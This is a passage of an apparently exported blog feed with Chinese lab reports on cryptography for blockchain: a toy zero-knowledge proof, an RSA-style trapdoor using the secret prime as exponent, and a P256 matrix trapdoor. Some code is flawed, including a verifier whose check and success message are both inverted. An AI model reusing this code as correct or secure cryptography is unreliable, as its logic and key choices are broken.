style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>，最后判断两者是否相等，若相等则返回True，否则返回False。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">p = <span class="number">15161</span></span><br><span class="line">f = <span class="number">3</span></span><br><span class="line">g = <span class="number">5</span></span><br><span class="line">r = <span class="number">101</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Prove</span>(<span class="params">s</span>):</span><br><span class="line">    k_1 = random.randint(<span class="number">1</span>, p)</span><br><span class="line">    <span class="comment"># print(k_1)</span></span><br><span class="line">    k_2 = random.randint(<span class="number">1</span>, p)</span><br><span class="line">    <span class="comment"># print(k_2)</span></span><br><span class="line">    f_ = <span class="built_in">pow</span>(f, k_1)</span><br><span class="line">    <span class="comment"># print(f_)</span></span><br><span class="line">    g_ = <span class="built_in">pow</span>(g, k_2)</span><br><span class="line">    z_1 = s + r * k_1</span><br><span class="line">    z_2 = s + r * k_2</span><br><span class="line">    <span class="keyword">return</span> f_, g_, z_1, z_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">F = <span class="built_in">pow</span>(f, r)</span><br><span class="line"><span class="comment"># print(F)</span></span><br><span class="line">G = <span class="built_in">pow</span>(g, r)</span><br><span class="line"><span class="comment"># print(G)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Verif</span>(<span class="params">f_, g_, z_1, z_2, s</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pow</span>(f, z_1) - <span class="built_in">pow</span>(f, s) * f_) % p == <span class="number">0</span> <span class="keyword">and</span> (</span><br><span class="line">        <span class="built_in">pow</span>(g, z_2) - <span class="built_in">pow</span>(g, s) * g_</span><br><span class="line">    ) % p == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    s = random.randint(<span class="number">1</span>, p)</span><br><span class="line">    <span class="comment"># print(s)</span></span><br><span class="line">    f_, g_, z_1, z_2 = Prove(s)</span><br><span class="line">    <span class="keyword">if</span> Verif(f_, g_, z_1, z_2, s):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;证明失败&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;证明成功&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数字货币与区块链</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Digital-Currency-and-Blockchain-Lab-2</title>
    <url>/posts/661cdd66.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>  1、实现数字签名算法。</p>
<p>  2、实现加密算法。</p>
<h1 id="实验器材"><a class="markdownIt-Anchor" href="#实验器材"></a> 实验器材</h1>
<p>  1、编译器：Vscode</p>
<p>  2、操作系统：windows10</p>
<p>  3、编程语言：Python 3.10.11</p>
<p>  4、库：ecc-pycrypto</p>
<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
<p>  本次实验基于 Python 以及 ecc-pycrypto 库来实现。其中我们将使用<br />
ecc-pycrypto 库中的 P256 椭圆曲线的一个简单实现。</p>
<h1 id="数字签名算法"><a class="markdownIt-Anchor" href="#数字签名算法"></a> 数字签名算法</h1>
<h2 id="问题1"><a class="markdownIt-Anchor" href="#问题1"></a> 问题1</h2>
<p>  在TrapGen函数中，首先生成两个大素数p和q，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mtext>，</mtext><mi>t</mi><mi>d</mi><mo>=</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">n=p*q，td=K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">t</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>的逆。在Eval函数中，首先计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><msup><mi>x</mi><mi>K</mi></msup><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">y=x^K\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8968909999999999em;vertical-align:-0.05556em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span></span></span></span><span class="mord">%</span></span></span></span>n，然后返回y。在Invert函数中，首先计算x=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mi>t</mi></msup><mi>d</mi><mi mathvariant="normal">%</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">y^td\%n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9879959999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span><span class="mord mathnormal">d</span><span class="mord">%</span><span class="mord mathnormal">n</span></span></span></span>，然后返回<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>。在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>s</mi><mi mathvariant="normal">_</mi><mi>p</mi><mi>r</mi><mi>i</mi><mi>m</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">is\_prime</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695199999999999em;vertical-align:-0.31em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span></span></span></span>函数中，首先判断n是否小于等于1或者<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>是否为偶数且大于2，如果是则返回False，否则判断<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>是否能被2到sqrt(n)之间的奇数整除，如果能则返回False，否则返回True。在generate_large_prime函数中，首先生成一个10**5到10**6之间的随机数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>，然后判断<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>是否为素数，如果是则返回p。在main函数中，首先调用generate_large_prime函数生成两个大素数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>∗</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">n=p*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，然后调用TrapGen函数生成陷门，然后调用Eval函数计算单向函数输出，然后调用Invert函数计算信息，最后判断信息是否等于单向函数输出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TrapGen</span>(<span class="params">p, q</span>):  <span class="comment"># 生成计算密钥与陷门</span></span><br><span class="line">    K = p</span><br><span class="line">    td = <span class="built_in">pow</span>(K, -<span class="number">1</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> K, td</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Eval</span>(<span class="params">K, x</span>):  <span class="comment"># 利用计算密钥和信息生成单向函数输出</span></span><br><span class="line">    y = <span class="built_in">pow</span>(x, K, n)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Invert</span>(<span class="params">td, y</span>):  <span class="comment"># 根据单向函数输出以及陷门，计算信息</span></span><br><span class="line">    x = <span class="built_in">pow</span>(y, td, n)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span> <span class="keyword">or</span> (n % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> n &gt; <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="built_in">int</span>(n**<span class="number">0.5</span>) + <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_large_prime</span>(<span class="params">start, end</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = random.randrange(start, end)</span><br><span class="line">        <span class="keyword">if</span> is_prime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成两个大素数</span></span><br><span class="line">p = generate_large_prime(<span class="number">10</span>**<span class="number">5</span>, <span class="number">10</span>**<span class="number">6</span>)</span><br><span class="line">q = generate_large_prime(<span class="number">10</span>**<span class="number">5</span>, <span class="number">10</span>**<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">m = <span class="number">4314141445</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文为：&quot;</span>, m)</span><br><span class="line">K, td = TrapGen(p, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密钥为：&quot;</span>, K, <span class="string">&quot;陷门为：&quot;</span>, td)</span><br><span class="line">Y = Eval(K, m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;输出密文为：&quot;</span>, Y)</span><br><span class="line">X = Invert(td, Y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密得到的明文为：&quot;</span>, X)</span><br></pre></td></tr></table></figure>
<h2 id="问题2"><a class="markdownIt-Anchor" href="#问题2"></a> 问题2</h2>
<p>  在createMatrix函数中，首先生成一个rows*cols的矩阵，然后将矩阵中的每个元素都设置为0到2**15-1之间的随机数，最后返回矩阵。在BitInvert函数中，首先遍历0到q之间的每个数x，然后判断<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo>∗</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">g*x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>是否等于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，如果是则返回<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>，否则返回0。在Eval函数中，首先计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mi mathvariant="normal">_</mi><mo>=</mo><mi>M</mi><mo>∗</mo><mi>x</mi><mi mathvariant="normal">%</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">y\_=M*x\%q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74056em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mord">%</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，然后遍历0到n之间的每个数i，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>g</mi><mo>∗</mo><mi>y</mi><mi mathvariant="normal">_</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">y[i]=g*y\_[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span>，最后返回y和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mi mathvariant="normal">_</mi></mrow><annotation encoding="application/x-tex">y\_</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74056em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord" style="margin-right:0.02778em;">_</span></span></span></span>。在TrapGen函数中，首先计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>d</mi><mo>=</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">td=M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>的逆，然后返回<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">td</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">d</span></span></span></span>。在Invert函数中，首先计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi mathvariant="normal">_</mi><mo>=</mo><mi>t</mi><mi>d</mi><mo>∗</mo><mi>y</mi><mi mathvariant="normal">_</mi></mrow><annotation encoding="application/x-tex">c\_=td*y\_</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74056em;vertical-align:-0.31em;"></span><span class="mord mathnormal">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74056em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord" style="margin-right:0.02778em;">_</span></span></span></span>，然后遍历0到n之间的每个数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span>，然后遍历0到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>之间的每个数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>y</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>∗</mo><mi>t</mi><mi>d</mi><mo stretchy="false">[</mo><mi>i</mi><mo>∗</mo><mi>n</mi><mo>+</mo><mi>j</mi><mo stretchy="false">]</mo><mo>+</mo><mi>c</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">c[i]=y[j]*td[i*n+j]+c[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">d</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span>，最后返回<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi mathvariant="normal">_</mi></mrow><annotation encoding="application/x-tex">c\_</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74056em;vertical-align:-0.31em;"></span><span class="mord mathnormal">c</span><span class="mord" style="margin-right:0.02778em;">_</span></span></span></span>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> ecc.curve <span class="keyword">import</span> P256</span><br><span class="line"></span><br><span class="line">k = <span class="number">152</span></span><br><span class="line">q = P256.n</span><br><span class="line">g = P256.G</span><br><span class="line"><span class="comment"># n = int(math.log(q / 15)) + 1</span></span><br><span class="line">n = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createMatrix</span>(<span class="params">rows, cols</span>):</span><br><span class="line">    arr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        col = [randint(<span class="number">0</span>, <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">15</span>) - <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(cols)]</span><br><span class="line">        arr.append(col)</span><br><span class="line">    <span class="keyword">return</span> sympy.Matrix(arr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">BitInvert</span>(<span class="params">y</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, q):</span><br><span class="line">        <span class="keyword">if</span> g * x == y:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Eval</span>(<span class="params">M, x_, y</span>):</span><br><span class="line">    y_ = M.multiply(x_) % q</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n):</span><br><span class="line">        y[i] = g * <span class="built_in">int</span>(y_[i])</span><br><span class="line">    <span class="comment"># print(y,y_)</span></span><br><span class="line">    <span class="keyword">return</span> y, y_</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TrapGen</span>(<span class="params">M</span>):</span><br><span class="line">    td = M.inv_mod(q)</span><br><span class="line">    <span class="comment"># print(M*td%q)</span></span><br><span class="line">    <span class="keyword">return</span> td</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Invert</span>(<span class="params">td, y, y_, c</span>):</span><br><span class="line">    c_ = td.multiply(y_) % q</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n):</span><br><span class="line">            c[i] = y[j] * td[i * n + j] + c[i]</span><br><span class="line">        <span 